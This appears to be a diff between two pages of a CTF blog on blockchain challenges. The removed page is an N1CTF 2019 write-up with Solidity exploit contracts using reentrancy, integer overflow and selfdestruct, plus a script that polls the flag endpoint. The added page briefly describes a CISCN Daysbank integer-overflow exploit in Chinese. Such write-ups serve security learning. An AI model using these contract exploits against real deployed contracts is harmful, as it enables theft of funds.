@@ -13,7 +13,7 @@
         <meta name="description" content="Kernel, Blockchain, CTF Crypto&PWN">
       
       
-        <link rel="canonical" href="https://beafb1b1.github.io/blockchain/n1ctf_2019_smartcontract/">
+        <link rel="canonical" href="https://beafb1b1.github.io/blockchain/ciscn2019_daysbank/">
       
       
         <meta name="author" content="b1b1">
@@ -42,7 +42,7 @@
     
     
       
-        <title>N1CTF2019 h4ck Smart Contract - b1b1's share</title>
+        <title>CISCN 2019 Daysbank - b1b1's share</title>
       
     
     
@@ -91,7 +91,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#challenges" tabindex="1" class="md-skip">
+      <a href="#ciscn-2018-daysbank" tabindex="1" class="md-skip">
         Skip to content
       </a>
     
@@ -117,7 +117,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                N1CTF2019 h4ck Smart Contract
+                CISCN 2019 Daysbank
               
             </span>
           
@@ -368,59 +368,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        N1CTF2019 h4ck Smart Contract
-      </label>
-    
-    <a href="./" title="N1CTF2019 h4ck Smart Contract" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../n1ctf_2019_smartcontract/" title="N1CTF2019 h4ck Smart Contract" class="md-nav__link">
       N1CTF2019 h4ck Smart Contract
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">Table of contents</label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#challenges" class="md-nav__link">
-    challenges
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    exploit
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sth-to-say" class="md-nav__link">
-    sth to say
-  </a>
-  
-</li>
-      
-      
-      
-      
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -452,11 +404,20 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../ciscn2019_daysbank/" title="CISCN 2019 Daysbank" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+    <a href="./" title="CISCN 2019 Daysbank" class="md-nav__link md-nav__link--active">
       CISCN 2019 Daysbank
     </a>
+    
   </li>
 
         
@@ -563,36 +524,8 @@
 <nav class="md-nav md-nav--secondary">
   
   
+    
   
-    <label class="md-nav__title" for="__toc">Table of contents</label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#challenges" class="md-nav__link">
-    challenges
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    exploit
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sth-to-say" class="md-nav__link">
-    sth to say
-  </a>
-  
-</li>
-      
-      
-      
-      
-      
-    </ul>
   
 </nav>
                   </div>
@@ -604,97 +537,15 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/beafb1b1/beafb1b1.github.io/blob/dev/docs/blockchain/n1ctf_2019_smartcontract.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/beafb1b1/beafb1b1.github.io/blob/dev/docs/blockchain/ciscn2019_daysbank.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                  <h1>N1CTF2019 h4ck Smart Contract</h1>
-                
-                <h2 id="challenges">challenges<a class="headerlink" href="#challenges" title="Permanent link">&para;</a></h2>
-<p><a href="https://github.com/beafb1b1/challenges/tree/master/n1ctf/2019_h4ck_Smart_Contract">https://github.com/beafb1b1/challenges/tree/master/n1ctf/2019_h4ck_Smart_Contract</a></p>
-<ul>
-<li>collectmoney: collect tokens and transfer to contract reentrancy 100 times</li>
-<li>reentrancy: buy and reentracy to int overflow the sellTimes</li>
-</ul>
-<h2 id="exploit">exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span>contract collectmoney{
-    address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0;
-    address public reentry;
-
-    function () payable {
-    }
-
-    function set_reentry(address target)
-    {
-        reentry=target;
-    }
-
-    function exploit(uint times)
-    {
-        for (uint i=0;i&lt;times;i++)
-        {
-            challenge(addr).buy.value(1)();
-            challenge(addr).transfer(reentry,1);
-        }
-    }
-
-}
-
-contract reentrancy{
-    address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0;
-    uint have_withdraw;
-
-    function attack_buy(){
-        challenge(addr).buy.value(1)();
-    }
-
-    function attack(){
-        challenge(addr).sell(100);
-    }
-
-    function () payable {
-        if (have_withdraw==0 &amp;&amp; msg.sender==addr){
-            have_withdraw=1;
-            challenge(addr).sell(100);
-        }
-    }
-
-    function getflag() public{
-        challenge(addr).winnerSubmit();
-    }
-}
-
-contract transfer_force{
-
-    address owner;
-
-    function () payable {
-    }
-
-    constructor()public{
-        owner = msg.sender;
-    }
-
-    modifier onlyOwner(){
-        require(msg.sender == owner);
-        _;
-    }
-
-    function kill(address to) public onlyOwner {
-        selfdestruct(to);
-    }
-}
-</pre></div>
-
-<h2 id="sth-to-say">sth to say<a class="headerlink" href="#sth-to-say" title="Permanent link">&para;</a></h2>
-<p>This challenge is not use the email solution to send the flag. Instead of that, it use a web interface which have a lot of problems. At the beginning of the game, flag can be obtained by getting someone else's winner's address and submitting it. Later, the organizers limited each winner address to only get flag once. But somebody made trouble by submitting other winner addresss indefinitely. So I had to use the following script to get the final flag.
-<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
-
-<span class="n">url</span><span class="o">=</span><span class="s2">&quot;http://47.244.41.61/challenge?address=0xfe03e84d6069fd0ca2679638eb80c4483885efd8&quot;</span>
-
-<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-    <span class="k">print</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;alert&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;script&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
-</pre></div>
-Maybe an <a href="/blockchain/email_bot/">email BOT</a> is a better choice.</p>
+                <h1 id="ciscn-2018-daysbank">ciscn 2018 daysbank<a class="headerlink" href="#ciscn-2018-daysbank" title="Permanent link">&para;</a></h1>
+<p><a href="https://github.com/beafb1b1/challenges/tree/master/ciscn/2018_daysbank">https://github.com/beafb1b1/challenges/tree/master/ciscn/2018_daysbank</a></p>
+<p>首先我们需要逆向逻辑，准备A和B两个账号，并分别使用两个账号获取gift和profit。主要gift和profit各只能获取一次，并且有严格的逻辑先后顺序。</p>
+<p>Gift和profit后，因为逻辑检查不严格，将会拥有转账权限，此时我们使用第一个transfer，将账号2的balance转给账号1。</p>
+<p>账号1的balance变为4后，可以使用transfer2函数，此时，利用整型溢出，向账号2转账4以上的balance，那么账号1的balance将会变为极大。</p>
+<p>然后payforflag即可。</p>
                 
                   
                 
@@ -731,7 +582,7 @@ Maybe an <a href="/blockchain/email_bot/">email BOT</a> is a better choice.</p>
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../realworldctf_2019_bank/" title="RWCTF2019 bank" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../bctf2018_fake3d_eosgame/" title="BCTF2018 Fake3d&EOSGAME" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -740,19 +591,19 @@ Maybe an <a href="/blockchain/email_bot/">email BOT</a> is a better choice.</p>
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                RWCTF2019 bank
+                BCTF2018 Fake3d&EOSGAME
               </span>
             </div>
           </a>
         
         
-          <a href="../hctf_2018_ez2win/" title="HCTF2018 ez2win" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../qwb2019_babybank_babybet/" title="QWB 2019 babybank&babybet" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                HCTF2018 ez2win
+                QWB 2019 babybank&babybet
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
